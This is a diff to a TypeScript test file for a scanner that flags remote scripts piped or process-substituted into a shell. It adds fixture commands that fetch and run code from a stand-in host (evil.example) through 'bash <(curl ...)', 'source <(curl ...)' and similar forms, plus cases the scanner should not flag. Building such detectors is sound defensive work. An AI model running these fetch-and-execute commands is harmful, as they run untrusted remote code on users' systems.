@@ -32,6 +32,11 @@ const PIPED: Record<string, string> = {
   "wget | dash": "wget -qO- https://evil.example/i.sh | dash",
   "sh -c $(curl ...)": 'sh -c "$(curl -fsSL https://evil.example/i.sh)"',
   "bash -c $(curl ...)": 'bash -c "$(curl -fsSL https://evil.example/i.sh)"',
+  "bash <(curl ...)": "bash <(curl -fsSL https://evil.example/i.sh)",
+  "sh <(curl ...)": "sh <(curl -fsSL https://evil.example/i.sh)",
+  "zsh <(wget ...)": "zsh <(wget -qO- https://evil.example/i.sh)",
+  "source <(curl ...)": "source <(curl -fsSL https://evil.example/i.sh)",
+  ". <(curl ...)": ". <(curl -fsSL https://evil.example/i.sh)",
 };
 
 test("a remote download piped or substituted into a shell is unsafe execution", () => {
@@ -63,6 +68,10 @@ test("a download that is not handed to a shell keeps no unsafe-execution finding
     "wget -qO- https://example.com/notes.txt | grep sh",
     "curl -fsSL https://example.com/data | /usr/local/bin/fish-wrapper",
     "curl -fsSL https://example.com/data | echo;/bin/sh",
+    "bash <(cat local.sh)",
+    "sh -s <(curl -fsSL https://example.com/i.sh)",
+    "bash -n <(curl -fsSL https://example.com/i.sh)",
+    "bash -c <(curl -fsSL https://example.com/i.sh)",
     "curl -fsSL https://example.com/data | fish\\\n-wrapper",
   ]) {
     const inspection = inspectRepository({
